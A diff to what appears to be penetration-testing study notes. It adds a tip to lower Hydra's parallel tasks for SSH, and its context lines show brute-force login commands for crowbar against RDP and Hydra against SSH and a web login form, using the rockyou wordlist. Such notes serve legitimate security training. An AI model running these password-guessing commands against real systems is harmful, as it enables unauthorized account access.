@@ -27,6 +27,7 @@ medusa -d(check out supported modules)
 crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
 ```
 ### Hydra
+>Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 ```
 hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
 hydra 10.11.0.22 http-form-post "/form/frontpage.php:user(post_form_key)=admin&pass(post_form_key)=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f(stop the attack when the first successful result is found)
